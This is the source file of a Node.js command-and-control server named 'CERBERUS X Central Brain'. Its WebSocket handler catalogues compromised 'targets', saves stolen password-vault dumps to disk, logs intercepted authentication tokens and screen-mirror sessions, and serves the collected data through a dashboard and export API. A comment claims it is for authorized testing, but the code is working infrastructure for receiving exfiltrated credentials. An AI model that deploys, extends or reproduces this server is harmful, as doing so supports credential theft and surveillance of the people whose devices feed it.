#!/usr/bin/env node
/**
 * CERBERUS X v2.0 - CENTRAL BRAIN
 * Secure WebSocket Server with Authentication & Database
 * 
 * Copyright (c) 2024 F1REW0LF
 * License: MIT - For authorized security testing only
 */

const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const https = require('https');
const express = require('express');

// ==================== CONFIGURATION ====================
const CONFIG = {
    PORT: 8443,
    WS_PORT: 8080,
    SSL: {
        key: '/etc/ssl/private/cerberus.key',
        cert: '/etc/ssl/certs/cerberus.crt'
    },
    AUTH: {
        enabled: true,
        token: 'CERBERUS_X_2026_SECURE_TOKEN_CHANGE_ME'
    },
    LOG_DIR: path.join(__dirname, 'logs'),
    DB_FILE: path.join(__dirname, 'cerberus.db'),
    MAX_CONNECTIONS: 100
};

// ==================== DATABASE ====================
class Database {
    constructor() {
        this.db = {};
        this.targets = {};
        this.logs = [];
        this.startTime = Date.now();
        this._load();
    }

    _load() {
        try {
            if (fs.existsSync(CONFIG.DB_FILE)) {
                const data = JSON.parse(fs.readFileSync(CONFIG.DB_FILE, 'utf8'));
                this.targets = data.targets || {};
                this.logs = data.logs || [];
                console.log('[DB] Loaded from file');
            }
        } catch (e) {
            console.log('[DB] New database created');
        }
    }

    _save() {
        try {
            fs.writeFileSync(CONFIG.DB_FILE, JSON.stringify({
                targets: this.targets,
                logs: this.logs.slice(-1000) // Keep last 1000 entries
            }, null, 2));
        } catch (e) {
            console.error('[DB] Save error:', e.message);
        }
    }

    addTarget(ip, data) {
        if (!this.targets[ip]) {
            this.targets[ip] = {
                first_seen: Date.now(),
                last_seen: Date.now(),
                ...data
            };
            this._save();
            return true;
        }
        this.targets[ip].last_seen = Date.now();
        this.targets[ip] = { ...this.targets[ip], ...data };
        this._save();
        return false;
    }

    addLog(level, message, data = {}) {
        const entry = {
            timestamp: Date.now(),
            level,
            message,
            data
        };
        this.logs.push(entry);
        this._save();
        return entry;
    }

    getTargets() {
        return this.targets;
    }

    getLogs(limit = 100) {
        return this.logs.slice(-limit);
    }

    getStats() {
        return {
            total_targets: Object.keys(this.targets).length,
            total_logs: this.logs.length,
            uptime: Date.now() - this.startTime,
            active: Object.values(this.targets).filter(t => 
                Date.now() - t.last_seen < 300000 // 5 minutes
            ).length
        };
    }
}

// ==================== SECURE WEBSOCKET SERVER ====================
class SecureWebSocketServer {
    constructor() {
        this.db = new Database();
        this.clients = new Map();
        this.broadcastQueue = [];
        this.isRunning = true;
        
        // Create log directory
        if (!fs.existsSync(CONFIG.LOG_DIR)) {
            fs.mkdirSync(CONFIG.LOG_DIR, { recursive: true });
        }
        
        // Setup HTTP server for dashboard
        this._setupHTTPServer();
        
        // Setup WebSocket
        this._setupWebSocket();
        
        // Start stats reporting
        this._startStatsReporting();
        
        console.log(`
        ╔═══════════════════════════════════════════════════════════════╗
        ║  CERBERUS X v2.0 - CENTRAL BRAIN ONLINE                     ║
        ║  Secure WebSocket Server with Authentication & Database     ║
        ║                                                             ║
        ║  WebSocket: wss://localhost:${CONFIG.WS_PORT}                      ║
        ║  Dashboard: https://localhost:${CONFIG.PORT}                      ║
        ║  Log Dir:   ${CONFIG.LOG_DIR}                              ║
        ║  Auth:      ${CONFIG.AUTH.enabled ? 'ENABLED' : 'DISABLED'}              ║
        ╚═══════════════════════════════════════════════════════════════╝
        `);
    }

    _setupHTTPServer() {
        const app = express();
        
        // Serve dashboard
        app.use(express.static(path.join(__dirname, '../c2_infrastructure')));
        
        // API endpoints
        app.get('/api/targets', (req, res) => {
            res.json(this.db.getTargets());
        });
        
        app.get('/api/logs', (req, res) => {
            const limit = parseInt(req.query.limit) || 100;
            res.json(this.db.getLogs(limit));
        });
        
        app.get('/api/stats', (req, res) => {
            res.json(this.db.getStats());
        });
        
        app.get('/api/export', (req, res) => {
            const data = {
                targets: this.db.getTargets(),
                logs: this.db.getLogs(1000),
                stats: this.db.getStats(),
                exported: Date.now()
            };
            res.json(data);
        });

        // Create HTTPS server
        try {
            if (fs.existsSync(CONFIG.SSL.key) && fs.existsSync(CONFIG.SSL.cert)) {
                const httpsOptions = {
                    key: fs.readFileSync(CONFIG.SSL.key),
                    cert: fs.readFileSync(CONFIG.SSL.cert)
                };
                https.createServer(httpsOptions, app).listen(CONFIG.PORT, () => {
                    console.log(`[+] HTTPS Dashboard running on port ${CONFIG.PORT}`);
                });
            } else {
                // Fallback: HTTP
                app.listen(CONFIG.PORT, () => {
                    console.log(`[!] HTTP Dashboard running on port ${CONFIG.PORT} (SSL not found)`);
                });
            }
        } catch (e) {
            app.listen(CONFIG.PORT, () => {
                console.log(`[!] HTTP Dashboard running on port ${CONFIG.PORT}`);
            });
        }
    }

    _setupWebSocket() {
        this.wss = new WebSocket.Server({ 
            port: CONFIG.WS_PORT,
            perMessageDeflate: true,
            maxPayload: 1024 * 1024 // 1MB
        });

        this.wss.on('connection', (ws, req) => {
            const clientIp = req.socket.remoteAddress;
            
            // Authentication
            let authenticated = false;
            
            ws.on('message', (message) => {
                try {
                    const data = JSON.parse(message);
                    
                    // Handle authentication
                    if (data.type === 'AUTH') {
                        if (CONFIG.AUTH.enabled) {
                            if (data.token === CONFIG.AUTH.token) {
                                authenticated = true;
                                this.clients.set(ws, { ip: clientIp, authenticated: true });
                                ws.send(JSON.stringify({ 
                                    type: 'AUTH_RESPONSE', 
                                    status: 'success',
                                    message: 'Authenticated successfully'
                                }));
                                this.db.addLog('INFO', `Client authenticated: ${clientIp}`);
                                console.log(`[+] Authenticated: ${clientIp}`);
                            } else {
                                ws.send(JSON.stringify({ 
                                    type: 'AUTH_RESPONSE', 
                                    status: 'failed',
                                    message: 'Invalid token'
                                }));
                                ws.close();
                            }
                        } else {
                            authenticated = true;
                            this.clients.set(ws, { ip: clientIp, authenticated: true });
                        }
                        return;
                    }
                    
                    // Skip if not authenticated
                    if (CONFIG.AUTH.enabled && !authenticated) {
                        ws.close();
                        return;
                    }
                    
                    // Process data
                    this._processData(ws, data, clientIp);
                    
                } catch (e) {
                    // Handle binary data
                    console.log(`[RAW] Binary data from ${clientIp}`);
                }
            });

            ws.on('close', () => {
                this.clients.delete(ws);
                console.log(`[x] Connection closed: ${clientIp}`);
            });
            
            ws.on('error', (error) => {
                console.error(`[ERR] WebSocket error: ${error.message}`);
            });
        });

        this.wss.on('error', (error) => {
            console.error(`[ERR] Server error: ${error.message}`);
        });

        console.log(`[+] WebSocket Server running on port ${CONFIG.WS_PORT}`);
    }

    _processData(ws, data, clientIp) {
        const timestamp = Date.now();
        
        switch(data.type) {
            case 'NEW_DEVICE':
                const isNew = this.db.addTarget(data.ip, {
                    mac: data.mac,
                    vendor: data.vendor,
                    is_target: data.is_target || false,
                    os: data.os || 'unknown',
                    hostname: data.hostname || 'unknown'
                });
                
                if (isNew) {
                    this.db.addLog('SUCCESS', `New device discovered: ${data.ip} (${data.vendor})`);
                    this._broadcast({
                        type: 'NEW_DEVICE',
                        ip: data.ip,
                        mac: data.mac,
                        vendor: data.vendor,
                        is_target: data.is_target || false,
                        os: data.os || 'unknown',
                        hostname: data.hostname || 'unknown'
                    });
                }
                break;
                
            case 'VAULT_DUMP':
                const vaultFile = path.join(CONFIG.LOG_DIR, `vault_${data.ip || 'unknown'}_${Date.now()}.json`);
                fs.writeFileSync(vaultFile, JSON.stringify({
                    timestamp: new Date().toISOString(),
                    ip: data.ip,
                    data: data.content
                }, null, 2));
                
                this.db.addLog('CRITICAL', `Vault dumped from ${data.ip || 'unknown'}`, { file: vaultFile });
                this._broadcast({
                    type: 'LOG',
                    level: 'critical',
                    message: `[VAULT DUMP] ${data.ip || 'unknown'} - ${Object.keys(data.content || {}).length} items`
                });
                console.log(`[!] VAULT DUMP: ${data.ip || 'unknown'} (${Object.keys(data.content || {}).length} items)`);
                break;
                
            case 'AUTH_EXFIL':
                this.db.addLog('CRITICAL', `Auth token intercepted from ${data.ip || 'unknown'}`, { token: data.data.substring(0, 20) });
                this._broadcast({
                    type: 'LOG',
                    level: 'critical',
                    message: `[AUTH] Token captured from ${data.ip || 'unknown'}`
                });
                console.log(`[CRITICAL] Auth Token from ${data.ip || 'unknown'}: ${data.data.substring(0, 30)}...`);
                break;
                
            case 'SCREEN_MIRROR':
                this.db.addLog('INFO', `Screen mirror started from ${data.ip || 'unknown'}`);
                this._broadcast({
                    type: 'SCREEN_MIRROR',
                    ip: data.ip,
                    status: 'active'
                });
                break;
                
            case 'LOG':
                this.db.addLog(data.level || 'INFO', data.message, data.data || {});
                this._broadcast(data);
                break;
                
            case 'PING':
                ws.send(JSON.stringify({ type: 'PONG', timestamp }));
                break;
                
            default:
                this.db.addLog('WARN', `Unknown data type: ${data.type} from ${clientIp}`);
        }
    }

    _broadcast(payload) {
        const message = JSON.stringify(payload);
        this.clients.forEach((client, ws) => {
            if (ws.readyState === WebSocket.OPEN) {
                try {
                    ws.send(message);
                } catch (e) {
                    console.error('[BROADCAST] Error:', e.message);
                }
            }
        });
    }

    _startStatsReporting() {
        setInterval(() => {
            const stats = this.db.getStats();
            console.log(`[STATS] Targets: ${stats.total_targets} | Active: ${stats.active} | Logs: ${stats.total_logs}`);
        }, 60000); // Every minute
    }

    shutdown() {
        console.log('\n[*] Shutting down Central Brain...');
        this.isRunning = false;
        this.wss.close();
        this.db._save();
        console.log('[+] Shutdown complete');
        process.exit(0);
    }
}

// ==================== MAIN ====================
process.on('SIGINT', () => {
    if (server) server.shutdown();
});

const server = new SecureWebSocketServer();
